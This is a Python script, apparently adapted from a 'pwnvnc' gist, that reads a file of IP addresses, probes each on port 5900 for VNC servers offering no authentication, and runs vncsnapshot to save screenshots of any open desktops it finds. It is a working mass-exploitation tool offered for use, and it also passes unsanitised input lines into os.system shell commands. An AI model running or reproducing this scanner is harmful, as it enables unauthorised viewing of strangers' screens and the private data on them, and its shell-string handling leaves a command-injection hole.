#!/usr/bin/env python
import socket
import os
import argparse
import re 

parser = argparse.ArgumentParser()

parser.add_argument('-f', help='Pass a file location string "~/Documents/list.txt"')
# parser.add_argument('--k', help='keyword                          note: use , for AND...use . for OR')
# parser.add_argument('--d', help='domain searches')

args = parser.parse_args()

f             = args.f
# k             = args.k
# s             = args.d

TCP_PORT = 5900
CURRENT_INDEX = 0

# Credit https://gist.github.com/slyd0g/c5a63d3ba4105ceff1930b50a5cf80fe#file-pwnvnc-py

#############################################################################################################
# Connect to designated IP over port 5900. Negotiate RFB version handshake + capture authentication methods #
# Returns '1' if no authentication is needed, else returns '0'                                              #
#############################################################################################################
def get_security(TCP_IP):
    snapshot_flag = 0
    vnc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    vnc_socket.settimeout(0.5)
    try:
        vnc_socket.connect(( TCP_IP,TCP_PORT ))
        RFB_VERSION = vnc_socket.recv(12)
        if "RFB" not in str(RFB_VERSION):
            return snapshot_flag
        vnc_socket.send(RFB_VERSION)
        num_of_auth = vnc_socket.recv(1)
        if not num_of_auth:
            return snapshot_flag
        for i in range(0,ord(num_of_auth)):
            if ord(vnc_socket.recv(1)) == 1:
                snapshot_flag = 1
            else:
                pass
        vnc_socket.shutdown(socket.SHUT_WR)
        vnc_socket.close()
    except socket.error:
        vnc_socket.close()
        pass
    except socket.timeout:
        vnc_socket.close()
        pass
    return snapshot_flag

################################################################################################
# Open list of IPs, call get_security() on each IP and snapshot if no authentication is needed #
################################################################################################
if __name__ == '__main__':
    print ("This program requires the user to have vncsnapshot downloaded and in the user's path. It can be cloned here: https://github.com/shamun/vncsnapshot\n")
    print ("also try sudo apt-get install vncsnapshot")
    # file_location = input("Please enter full file path to list of IPs.\nExample: /home/user/Documents/list.txt\nFull path: ")
    file_location = f
    print ("\nRunning ...")
    print ("Note ... current index will be kept in new file 'index.txt' if for some reason the program is interrupted")
    with open(file_location) as file:
        for line in file:
            ip_addr = line.strip('\n')
            vncsnap_flag = get_security(ip_addr)
            CURRENT_INDEX = CURRENT_INDEX + 1
            os.system("echo " + str(CURRENT_INDEX) + " > index.txt")
            if vncsnap_flag == 1:
                CMD = "timeout 10 vncsnapshot -allowblank " + ip_addr + ":0 " + ip_addr + ".jpg > /dev/null 2>&1"
                os.system(CMD)
            else:
                pass
print("Program complete, enjoy sifting through your results :-)")